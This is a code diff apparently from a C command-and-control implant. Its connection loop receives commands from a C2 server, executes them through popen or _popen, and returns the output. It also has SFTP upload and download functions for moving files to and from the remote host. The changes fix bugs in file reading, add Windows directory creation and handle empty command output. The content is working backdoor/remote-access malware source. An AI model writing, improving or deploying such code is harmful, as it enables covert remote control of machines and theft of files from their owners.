@@ -73,7 +73,7 @@ void handleConnection()
     {
         // get cmd from c2
         rcvMsg(cmd);
-        printf("[+] Got cmd from c2: %s\n", cmd);;
+        printf("[+] Got cmd from c2: %s\n", cmd);
 
         if(strcmp(cmd, "quit") == 0 || cmd[0] == '\0')
         {
@@ -112,9 +112,12 @@ void handleConnection()
             // execute cmd
             printf("[+] Executing cmd...\n");
             output = execCmd(cmd);
+            if (output.array[0] == '\0')
+            {
+                output.array = "No output";
+            }
             printf("[+] Sending output to server.\n");
             sendMsg(output.array);
-            freeArray(&output);
         }
 
         // clear the cmd buffer
@@ -199,7 +202,7 @@ sftp_session setupSFTP()
 void upload(char *localFilePath, char* remoteFilePath)
 {
     FILE* localFile;
-    char fileBuffer[MAX_BUFF_SIZE];
+    char *fileBuffer;
     sftp_file file;
     ssize_t nwritten;
     int length;
@@ -208,7 +211,7 @@ void upload(char *localFilePath, char* remoteFilePath)
 
     // read the local file
     localFile = fopen(localFilePath, "r");
-    fgets(fileBuffer, MAX_BUFF_SIZE, localFile);
+    fileBuffer = readFile(localFile, &length);
 
     // create SFTP session
     sftp_session sftp;
@@ -228,7 +231,6 @@ void upload(char *localFilePath, char* remoteFilePath)
     }
 
     // write to it
-    length = sizeof(fileBuffer) / sizeof(char);
     nwritten = sftp_write(file, fileBuffer, length);
     if (nwritten != length)
     {
@@ -268,7 +270,11 @@ void download(char *remoteFilePath, char* localFilePath)
     // make download directory if it doesn't exist yet
     if (!dirExists(dirName))
     {
+#if defined(WIN32) || defined(_WIN32) || defined(__WIN32) && !defined(__CYGWIN__)
+        if (_mkdir(dirName) == -1)
+#else
         if (mkdir(dirName, 0777) == -1)
+#endif
         {
             printf("[-] Error creating downloads directory!\n");
         }
@@ -331,7 +337,7 @@ Array execCmd(char* cmd)
     if ((filePointer = _popen(cmd, "r")) == NULL)
     {
         fprintf(stderr, "[-] Error opening pipe!\n");
-        return NULL;
+        return output;
     }
 #else
     if ((filePointer = popen(cmd, "r")) == NULL)
